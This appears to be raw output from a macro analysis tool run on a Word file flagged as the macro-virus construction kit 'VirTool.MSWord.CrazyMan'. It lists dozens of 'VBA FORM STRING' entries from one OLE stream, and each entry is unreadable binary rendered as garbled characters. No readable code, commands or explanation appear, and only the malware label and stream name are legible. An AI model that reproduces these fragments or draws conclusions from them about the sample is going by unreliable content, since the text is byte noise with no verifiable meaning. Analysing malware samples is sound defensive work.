- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�$��$��A��(��&|�4l�#c�'��+��.��7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�8n�.n�C��/��*��:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�"^�?}�7��*��:��#|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�!k�.��:��;��)�� x�#a�'k�'��*��$��>��	D�8p�6r�F��3��9��5��#|�!m�>��?��%��7��&��d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�=t�&k�D��'��5��5��/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�3��:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��7��C�2e� b�C��(��*��8��/��#��1��B��.��A��4��W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:vFf�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Pp@��!{�9��&y�
\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�0��<��1��A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�)N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�A��/��6��&��%}�/��3��>��<��B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�L��0\t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�-��,~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�1��/��(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�3r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&x#x�5��&|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�*��8��:��9��)��8��N��

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*4n�B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:r�Ky�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/>��.��-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d� d�B��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�7��:��H��8��1��<��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�0f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�/��J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Qj+��)��5��%}�#i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�5x�T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�Ja�#I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}F��5��<��C��@��K��G��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�>f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��6��9��7|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"8��#��?��=��$��&��,r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cb��g��U��1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�;{�@��1��K��B��N��U��V��G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&Q/��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��1��E��(Ro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+>7��5��E��L��6��3��<��;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�O��o��n��o��f��N��;��#|�D��9��B��B��L��H��E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7e8��^��a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��2��9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Lb)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3u�@��K��G��L��=��W��A��b��l��h��d��0��&��C��:��<��3��1��/��+��1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0Q6P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6��L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��E��0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9X8��!k�+`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�;��R��_��]��U��L��c��q��j��p��G��A��M��3��>��/|�1{�.v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�*t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6+4Z$��E��J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��K��;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>6��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d"U�5n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�^��D��R��c��s��s��c��=��>��7��6o�@i�Lv�S��'_�1s�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:5��A��O��k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^��B��J��$&1A99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��/��(�@{����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2b4W�(Y�G��Q��U��|��b��T��&��N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�0O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=9<b���&b�/q�7t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<j�F��I��\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��4��2_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#=m�4��-��,a�>Sr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�E��[��y��c��[��D��2x�6k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(Ge~N��R�� i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L}?FO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?��M��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[��<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/[�2��7��.u�1bx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2_@�5��d��y��k��d��G�� h�K��4}�3{�[��N��A��2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��_��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:a�:��#��)��N��]��V��>i~2X�0{�l��o��\��V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�)v�(��?��C��8��,��7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
17>.`0��>��4��B��;w}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5&f�g��W��C��`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2#Kg`��L��:��D��8��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c��N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<m2z�Bs�<`p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ln��f��J��+Vi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0r�Q��G��&��L��#8T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ak�n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"W�Y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#:`6a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-n��^��d��l��W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%n�>��Tz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,DM��]��V��O��P��Z��_��V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#X��\��Q��[��R��E��F��Y��k��F��>��X��X��c��e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jj>t�^��i��~��k��2g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 %$FFF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormFertig/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
